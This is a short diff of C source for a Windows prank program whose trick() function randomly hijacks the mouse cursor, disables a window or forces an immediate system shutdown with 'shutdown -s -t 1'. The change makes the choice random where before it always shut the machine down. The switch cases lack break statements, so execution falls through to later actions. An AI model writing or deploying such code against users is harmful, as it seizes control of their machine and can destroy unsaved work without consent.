@@ -4,7 +4,7 @@ void trick()
 {
 	srand((unsigned)time(0));
 	int r;
-	r = 3;// (rand() % 3) + 1;
+	r = (rand() % 3) + 1;
 	switch (r) {
 	case 1: crazyMouse();
 	case 2: disableWindow();
@@ -14,7 +14,8 @@ void trick()
 
 void crazyMouse()
 {
-	for (int i = 0; i < 2000; i++) {
+	for (int i = 0; i < 2000; i++)
+	{
 		POINT pt = { rand() % 800, rand() % 600 }; SetCursorPos(pt.x, pt.y);
 		Sleep(100);
 	}
@@ -30,4 +31,3 @@ void restartSystem()
 {
 	system("shutdown -s -t 1");
 }
-
